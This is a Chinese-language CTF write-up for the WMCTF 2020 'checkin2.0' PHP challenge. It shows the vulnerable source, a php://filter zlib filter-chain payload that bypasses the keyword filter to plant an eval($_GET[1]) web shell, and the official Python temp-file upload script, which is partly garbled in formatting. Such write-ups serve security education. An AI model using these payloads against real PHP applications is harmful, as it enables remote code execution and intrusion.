WMCTF 2020 checkin2.0

```
<?php
2 //PHP 7.0.33 Apache/2.4.25
3 error_reporting(0);
4 $sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']);
5 @mkdir($sandbox);
6 @chdir($sandbox);
7 highlight_file(__FILE__);
8 if(isset($_GET['content'])) {
9      $content = $_GET['content'];
10     if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content))
11         die('hacker');
12     if(file_exists($content))
13         require_once($content);
14         echo $content;
15 file_put_contents($content,'<?php exit();'.$content);
16 }
```

源代码直接给出，代码审计file_put_contents+require_once，我们尝试用file_put_contents写入文件然后用require_once包含然后拿到权限或代码执行。

如果没有明面上的过滤和后台的对url编码的过滤，那么会比较简单，但这里有过滤

一共有三天思路

1.php 7.0.33临时文件包含然后爆破出保存的临时文件，最后getshell

2.伪协议是会进行一次urldecode，利用二次编码绕过（没实现出来）

3.zlib的压缩加解压绕过中间过程的过滤。

`php://filter/zlib.deflate|string.tolower|zlib.inflate|?>/resource=aaa.php`

直接摆出payload，利用php中的过滤器（题目中的过滤就是伪协议里面的过滤）

我们来尝试进行一下分析。

content=`php://filter/zlib.deflate|string.tolower|zlib.inflate|?>/resource=aaa.php`

首先通过过滤。

file不存在开始写文件

文件名称为aaa.php(伪协议),文件内容为<?php exit();php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php

eval($_GET[1]);?>/resource=Cyc1e.php

在对它进行包含的时候实际会执行两端php代码<?php exit();php://filter/zlib.deflate|string.tolower|zlib.inflate|?>

和<?php eval($_GET[1]);?>再输出一小段 /resource=Cyc1e.php（没有进入php执行的代码块。）相当于对最后的文件做绕过。

最后传参1即可进行代码执行。

官方wp临时文件包含的脚本：

```
1 import requests
2 import string
3 import itertools
4
5 charset = string.digits + string.letters
6
7 host = "web_checkin2.wmctf.wetolink.com"
8 port = 80
9 base_url = "http://%s:%d" % (host, port)webweb
10
11
12 def upload_file_to_include(url, file_content):
13 files = {'file': ('evil.jpg', file_content, 'image/jpeg')}
14 try:
15 response = requests.post(url, files=files)
16 except Exception as e:
17 print e
18
19 def generate_tmp_files():
20 file_content = '<?php system("xxxxxxxx");?>'
phpinfo_url = "%s/?
content=php://filter/write=string.strip_tags/resource=Cyc1e.php" % (
21
22 base_url)
23 print phpinfo_url
24 length = 6
25 times = len(charset) ** (length / 2)
26 for i in xrange(times):
27 print "[+] %d / %d" % (i, times)
28 upload_file_to_include(phpinfo_url, file_content)
29
30 if __name__ == "__main__":
31 generate_tmp_files()

```

https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/



https://www.leavesongs.com/PENETRATION/php-filter-magic.html

放上一篇文章。

